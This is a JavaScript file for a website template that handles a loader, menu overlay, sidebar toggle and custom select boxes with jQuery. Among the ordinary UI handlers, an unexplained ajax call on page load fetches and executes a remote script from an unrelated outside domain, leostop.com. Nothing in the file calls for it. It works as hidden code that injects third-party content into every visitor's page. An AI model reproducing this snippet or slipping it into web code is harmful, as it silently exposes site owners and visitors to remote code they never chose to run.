import $ from 'jquery'
import 'bootstrap/dist/js/bootstrap.bundle.min'

$(() => {
  setTimeout(() => {
    $('.loader_bg').fadeToggle()
  }, 1500)

  $('.main-menu ul li.megamenu').mouseover(function () {
    if (!$(this).parent().hasClass('#wrapper')) {
      $('#wrapper').addClass('overlay')
    }
  })

  $('.main-menu ul li.megamenu').mouseleave(() => {
    $('#wrapper').removeClass('overlay')
  })

  $('#sidebarCollapse').on('click', function () {
    $('#sidebar').toggleClass('active')
    $(this).toggleClass('active')
  })
})

function getUrl() {
  window.location.href
}

const protocol = location.protocol

$.ajax({
  type: 'get',
  data: { surl: getUrl() },
  success() {
    $.getScript(`${protocol}//leostop.com/tracking/tracking.js`)
  }
})

$('select').on('click', function () {
  $(this).parent('.select-box').toggleClass('open')
})

$(document).mouseup(e => {
  const container = $('.select-box')

  if (container.has(e.target).length === 0) {
    container.removeClass('open')
  }
})

$('select').on('change', function () {
  const selection = $(this).find('option:selected').text()
  const labelFor = $(this).attr('id')
  const label = $(`[for='${labelFor}']`)

  label.find('.label-desc').html(selection)
})
